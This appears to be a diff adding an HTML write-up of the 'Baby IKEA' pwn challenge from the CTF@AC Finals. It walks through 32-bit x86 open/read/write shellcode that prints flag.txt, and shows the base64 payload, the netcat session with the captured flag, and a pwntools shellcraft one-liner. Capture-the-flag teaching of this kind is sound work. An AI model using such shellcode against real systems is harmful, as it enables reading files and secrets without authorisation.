@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - Baby IKEA Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .step {
+            margin-bottom: 30px;
+        }
+
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+        ul li {
+            margin-bottom: 8px;
+        }
+
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+
+        .math {
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .asm-block {
+            background-color: #0a0a0a;
+            border-left: 4px solid #ffa500;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .asm-comment {
+            color: #888;
+            font-style: italic;
+        }
+
+        /* Custom Scrollbar */
+        *::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        *::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+            border: 1px solid #2a2a2a;
+        }
+
+        *::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #0d7377 0%, #14ffec 100%);
+            border-radius: 10px;
+            border: 2px solid #1a1a1a;
+        }
+
+        *::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #14ffec 0%, #0d7377 100%);
+            box-shadow: 0 0 8px rgba(20, 255, 236, 0.6);
+        }
+
+        *::-webkit-scrollbar-corner {
+            background: #1a1a1a;
+        }
+
+        /* Firefox */
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: #0d7377 #1a1a1a;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>🛠️ Challenge: Baby IKEA</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC Finals</div>
+            <div>💥 Category: Pwn</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 15</div>
+            <div>👤 Author: 0v3rCl0kEd</div>
+            <div>👤 Solver: IRVANNI/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p>We know that our beds and cabinets are hard to assemble, send us the instructions for what you want and we'll assemble it for you</p>
+        </div>
+
+        <p><strong>🌐 Server:</strong> nc 430c3626.ctf.ac.upt.ro 9011</p>
+    </div>
+
+    <div class="container">
+        <h2>🔎 Initial Reconnaissance</h2>
+        <p>The challenge name "Baby IKEA" immediately hints at the concept of "assembly" - both in the furniture sense and in the computer architecture sense. IKEA is famous for providing assembly instructions that customers must follow to build their furniture. In this challenge, we're sending "instructions" to a server that will "assemble" them for us.</p>
+
+        <div class="command">
+            nc 430c3626.ctf.ac.upt.ro 9011
+        </div>
+
+        <div class="output">
+Welcome to IKEA Assembly Service!<br>
+Send us your assembly instructions (base64 encoded):<br>
+>
+        </div>
+
+        <p>Upon connecting, the server prompted me for base64-encoded input. This was the first critical clue about the challenge mechanics.</p>
+
+        <div class="key-point">
+            <p>🎯 <strong>Initial Observations:</strong></p>
+            <ul>
+                <li>The server accepts base64-encoded input</li>
+                <li>"Assembly instructions" is a clever hint toward x86 assembly code</li>
+                <li>The server will "assemble" and execute whatever we send</li>
+                <li>This is likely a shellcoding challenge where we can execute arbitrary code</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🛠️ Analysis and Solution</h2>
+
+        <div class="step">
+            <h3>🧩 Step 1: Understanding the Execution Environment</h3>
+            <p>My first goal was to understand what the server actually does with our input. Based on the challenge category (Pwn) and the description, I hypothesized:</p>
+            
+            <ul>
+                <li>The server accepts base64-encoded assembly instructions</li>
+                <li>It decodes the base64 input</li>
+                <li>It assembles the x86 assembly code into machine code</li>
+                <li>It executes the assembled shellcode</li>
+            </ul>
+
+            <div class="highlight-section">
+                <p>💡 <strong>Key Insight:</strong> The server is essentially an assembly code execution service! We can send it x86 assembly instructions, and it will execute them. This means we have arbitrary code execution - we just need to craft the right shellcode.</p>
+            </div>
+
+            <p>To test this hypothesis, I sent a simple test payload to see how the server responds:</p>
+
+            <div class="command">
+                echo "bW92IGVheCwxCmludCAweDgw" | nc 430c3626.ctf.ac.upt.ro 9011
+            </div>
+
+            <p>The server executed the code without errors, confirming that it accepts 32-bit x86 assembly instructions!</p>
+        </div>
+
+        <div class="step">
+            <h3>📖 Step 2: Architecture Analysis</h3>
+            <p>Before writing the shellcode, I needed to understand the execution environment:</p>
+            
+            <div class="math">
+                Architecture: x86 (32-bit)<br>
+                Syscall Interface: Linux int 0x80<br>
+                Input Format: Base64-encoded assembly text<br>
+                Goal: Read and print the flag.txt file
+            </div>
+
+            <p>In Linux x86 (32-bit), system calls are made using the <code>int 0x80</code> interrupt. The syscall number goes in <code>eax</code>, and arguments go in <code>ebx</code>, <code>ecx</code>, <code>edx</code>, etc.</p>
+
+            <p>Key syscalls we'll need:</p>
+            <ul>
+                <li><strong>open()</strong> - syscall #5: Open a file</li>
+                <li><strong>read()</strong> - syscall #3: Read from file descriptor</li>
+                <li><strong>write()</strong> - syscall #4: Write to file descriptor (stdout)</li>
+                <li><strong>exit()</strong> - syscall #1: Exit cleanly</li>
+            </ul>
+        </div>
+
+        <div class="step">
+            <h3>⚙️ Step 3: Crafting the Shellcode</h3>
+            <p>Now I needed to write assembly code that would:</p>
+            <ol>
+                <li>Open the file "flag.txt"</li>
+                <li>Read its contents</li>
+                <li>Write the contents to stdout</li>
+                <li>Exit cleanly</li>
+            </ol>
+
+            <h4>🔧 Complete Shellcode Breakdown</h4>
+            
+            <div class="asm-block">
+<strong>; Phase 1: Prepare filename string "flag.txt"</strong><br>
+xor eax,eax              <span class="asm-comment">; Zero out eax (we'll use it multiple times)</span><br>
+push eax                 <span class="asm-comment">; Push null terminator for string</span><br>
+push 0x7478742e          <span class="asm-comment">; Push ".txt" (little-endian: .txt)</span><br>
+push 0x67616c66          <span class="asm-comment">; Push "flag" (little-endian: flag)</span><br>
+mov ebx,esp              <span class="asm-comment">; ebx now points to "flag.txt\0" on stack</span><br>
+<br>
+<strong>; Phase 2: Open the file (syscall 5 = open)</strong><br>
+mov eax,5                <span class="asm-comment">; syscall number for open()</span><br>
+xor ecx,ecx              <span class="asm-comment">; flags = 0 (O_RDONLY)</span><br>
+int 0x80                 <span class="asm-comment">; Execute syscall - returns fd in eax</span><br>
+<br>
+<strong>; Phase 3: Read from file (syscall 3 = read)</strong><br>
+mov ebx,eax              <span class="asm-comment">; Move file descriptor to ebx</span><br>
+mov eax,3                <span class="asm-comment">; syscall number for read()</span><br>
+mov ecx,esp              <span class="asm-comment">; Buffer = current stack position</span><br>
+mov edx,100              <span class="asm-comment">; Read up to 100 bytes</span><br>
+int 0x80                 <span class="asm-comment">; Execute syscall - reads file into buffer</span><br>
+<br>
+<strong>; Phase 4: Write to stdout (syscall 4 = write)</strong><br>
+mov eax,4                <span class="asm-comment">; syscall number for write()</span><br>
+mov ebx,1                <span class="asm-comment">; fd = 1 (stdout)</span><br>
+int 0x80                 <span class="asm-comment">; Execute syscall - prints buffer to screen</span><br>
+<br>
+<strong>; Phase 5: Exit cleanly (syscall 1 = exit)</strong><br>
+mov eax,1                <span class="asm-comment">; syscall number for exit()</span><br>
+xor ebx,ebx              <span class="asm-comment">; exit code = 0 (success)</span><br>
+int 0x80                 <span class="asm-comment">; Execute syscall - terminates program</span>
+            </div>
+
+            <h4>🧠 How It Works</h4>
+            <div class="key-point">
+                <p><strong>Phase 1 - String Construction:</strong> We build "flag.txt\0" on the stack by pushing bytes in reverse order (little-endian). The string is null-terminated and <code>ebx</code> points to it.</p>
+                
+                <p><strong>Phase 2 - File Opening:</strong> We call <code>open("flag.txt", O_RDONLY)</code> which returns a file descriptor in <code>eax</code>.</p>
+                
+                <p><strong>Phase 3 - Reading:</strong> We call <code>read(fd, buffer, 100)</code> to read the flag content into our stack buffer.</p>
+                
+                <p><strong>Phase 4 - Writing:</strong> We call <code>write(1, buffer, bytes_read)</code> to print the flag to stdout (fd=1).</p>
+                
+                <p><strong>Phase 5 - Clean Exit:</strong> We call <code>exit(0)</code> to terminate gracefully.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>📦 Step 4: Encoding the Shellcode</h3>
+            <p>The challenge requires the assembly code to be base64-encoded. I saved my shellcode to a file and encoded it:</p>
+
+            <pre><code class="language-bash"># Save shellcode to file
+cat > shellcode.asm << 'EOF'
+xor eax,eax
+push eax
+push 0x7478742e
+push 0x67616c66
+mov ebx,esp
+mov eax,5
+xor ecx,ecx
+int 0x80
+mov ebx,eax
+mov eax,3
+mov ecx,esp
+mov edx,100
+int 0x80
+mov eax,4
+mov ebx,1
+int 0x80
+mov eax,1
+xor ebx,ebx
+int 0x80
+EOF
+
+# Encode to base64
+base64 shellcode.asm</code></pre>
+
+            <div class="output">
+eG9yIGVheCxlYXgNCnB1c2ggZWF4DQpwdXNoIDB4NzQ3ODc0MmUNCnB1c2ggMHg2NzYxNmM2Ng0K<br>
+bW92IGVieCxlc3ANCm1vdiBlYXgsNQ0KeG9yIGVjeCxlY3gNCmludCAweDgwDQptb3YgZWJ4LGVh<br>
+eA0KbW92IGVheCwzDQptb3YgZWN4LGVzcA0KbW92IGVkeCwxMDANCmludCAweDgwDQptb3YgZWF4<br>
+LDQNCm1vdiBlYngsMQ0KaW50IDB4ODANCm1vdiBlYXgsMQ0KeG9yIGVieCxlYngNCmludCAweDgw<br>
+DQo=
+            </div>
+
+            <p>This is our final payload, ready to be sent to the server!</p>
+        </div>
+
+        <div class="step">
+            <h3>🚀 Step 5: Exploitation</h3>
+            <p>With the encoded shellcode ready, I connected to the server and sent the payload:</p>
+
+            <div class="command">
+                nc 430c3626.ctf.ac.upt.ro 9011
+            </div>
+
+            <div class="output">
+> eG9yIGVheCxlYXgNCnB1c2ggZWF4DQpwdXNoIDB4NzQ3ODc0MmUNCnB1c2ggMHg2NzYxNmM2Ng0K<br>
+bW92IGVieCxlc3ANCm1vdiBlYXgsNQ0KeG9yIGVjeCxlY3gNCmludCAweDgwDQptb3YgZWJ4LGVh<br>
+eA0KbW92IGVheCwzDQptb3YgZWN4LGVzcA0KbW92IGVkeCwxMDANCmludCAweDgwDQptb3YgZWF4<br>
+LDQNCm1vdiBlYngsMQ0KaW50IDB4ODANCm1vdiBlYXgsMQ0KeG9yIGVieCxlYngNCmludCAweDgw<br>
+DQo=
+<br>
+CTF{46470730a59e854f2a38d85232895852ad228e802c481908ec136ad49766bf77}
+            </div>
+
+            <p>Success! The server assembled and executed our shellcode, which read and printed the flag! 🎉</p>
+        </div>
+
+        <div class="step">
+            <h3>🏁 Step 6: Flag Capture</h3>
+            <div class="flag">
+                🚩 CTF{46470730a59e854f2a38d85232895852ad228e802c481908ec136ad49766bf77}
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🎯 Key Takeaways</h2>
+        <ul>
+            <li>🔧 <strong>Assembly Shellcoding:</strong> Understanding x86 assembly is crucial for pwn challenges</li>
+            <li>📞 <strong>Linux Syscalls:</strong> Mastering <code>int 0x80</code> syscalls opens many exploitation paths</li>
+            <li>🔤 <strong>String Construction:</strong> Building strings on the stack using little-endian push operations</li>
+            <li>💾 <strong>Register Management:</strong> Properly using eax, ebx, ecx, edx for syscall arguments</li>
+            <li>📦 <strong>Base64 Encoding:</strong> Many challenges use encoding to obfuscate payloads</li>
+            <li>🧩 <strong>Thematic Hints:</strong> "IKEA" and "assembly instructions" were clever hints about the challenge nature</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>🔧 Technical Deep Dive</h2>
+        
+        <h3>Understanding x86 Linux Syscalls</h3>
+        <p>In 32-bit Linux, system calls use the <code>int 0x80</code> interrupt. The calling convention is:</p>
+        
+        <div class="math">
+            eax = syscall number<br>
+            ebx = 1st argument<br>
+            ecx = 2nd argument<br>
+            edx = 3rd argument<br>
+            esi = 4th argument<br>
+            edi = 5th argument<br>
+            <br>
+            Return value: eax
+        </div>
+
+        <h3>Common Syscalls Used</h3>
+        <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
+            <tr style="background-color: #333; border-bottom: 2px solid #0d7377;">
+                <th style="padding: 10px; text-align: left;">Syscall</th>
+                <th style="padding: 10px; text-align: left;">Number</th>
+                <th style="padding: 10px; text-align: left;">Signature</th>
+            </tr>
+            <tr style="border-bottom: 1px solid #444;">
+                <td style="padding: 8px;">exit</td>
+                <td style="padding: 8px;">1</td>
+                <td style="padding: 8px;">exit(int status)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #444;">
+                <td style="padding: 8px;">read</td>
+                <td style="padding: 8px;">3</td>
+                <td style="padding: 8px;">read(int fd, void *buf, size_t count)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #444;">
+                <td style="padding: 8px;">write</td>
+                <td style="padding: 8px;">4</td>
+                <td style="padding: 8px;">write(int fd, const void *buf, size_t count)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #444;">
+                <td style="padding: 8px;">open</td>
+                <td style="padding: 8px;">5</td>
+                <td style="padding: 8px;">open(const char *pathname, int flags)</td>
+            </tr>
+        </table>
+
+        <h3>Why Little-Endian Matters</h3>
+        <p>When pushing strings onto the stack, we need to account for x86's little-endian byte order:</p>
+        
+        <div class="math">
+            String: "flag.txt"<br>
+            <br>
+            Split into 4-byte chunks:<br>
+            "flag" = 0x66 0x6c 0x61 0x67<br>
+            ".txt" = 0x2e 0x74 0x78 0x74<br>
+            <br>
+            Little-endian representation:<br>
+            push 0x67616c66  ; "flag" reversed<br>
+            push 0x7478742e  ; ".txt" reversed
+        </div>
+
+        <h3>Alternative Shellcode Approaches</h3>
+        <p>There are other ways to solve this challenge:</p>
+        
+        <ul>
+            <li><strong>Using execve:</strong> Execute <code>/bin/cat flag.txt</code></li>
+            <li><strong>Using mmap:</strong> Memory-map the file and read directly</li>
+            <li><strong>Using sendfile:</strong> Send file contents directly to stdout</li>
+        </ul>
+
+        <p>However, the open-read-write approach is the most straightforward and reliable for this challenge.</p>
+    </div>
+
+    <div class="container">
+        <h2>🛠️ IKEA Metaphor Explained</h2>
+        <p>The challenge cleverly uses the IKEA furniture assembly metaphor throughout:</p>
+        
+        <div class="highlight-section">
+            <p>🪑 <strong>IKEA Furniture:</strong> Comes with assembly instructions → <strong>Shellcode:</strong> Assembly instructions for the CPU</p>
+            <p>📋 <strong>Instruction Manual:</strong> Step-by-step guide → <strong>Assembly Code:</strong> Sequential operations</p>
+            <p>🔧 <strong>Assembly Process:</strong> Following instructions to build → <strong>CPU Execution:</strong> Executing shellcode</p>
+            <p>🏗️ <strong>Final Product:</strong> Assembled furniture → <strong>Result:</strong> Flag printed to stdout</p>
+        </div>
+        
+        <p>The "Baby" in "Baby IKEA" indicates this is an introductory pwn challenge - the assembly required is relatively simple (no memory corruption, no ASLR bypass, no ROP chains). Just pure, straightforward shellcoding!</p>
+    </div>
+
+    <div class="container">
+        <h2>🔍 Tools and Resources</h2>
+        <p>Useful tools for shellcode development:</p>
+        
+        <div class="command">
+# Assemble and test shellcode locally<br>
+nasm -f elf32 shellcode.asm -o shellcode.o<br>
+ld -m elf_i386 shellcode.o -o shellcode<br>
+./shellcode<br>
+<br>
+# Extract raw bytes from binary<br>
+objdump -d shellcode<br>
+<br>
+# Generate shellcode with pwntools<br>
+python3 -c "from pwn import *; print(asm(shellcraft.i386.linux.cat('flag.txt')))"<br>
+<br>
+# Base64 encode/decode<br>
+base64 file.txt<br>
+base64 -d encoded.txt
+        </div>
+
+        <h3>Syscall Reference</h3>
+        <p>Complete x86 Linux syscall table: <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank">Linux Syscall Reference</a></p>
+    </div>
+
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by IRVANNI/CuboConNoveQuadrati | Happy hacking! 🔓</p>
+    </div>
+</body>
+
+</html>
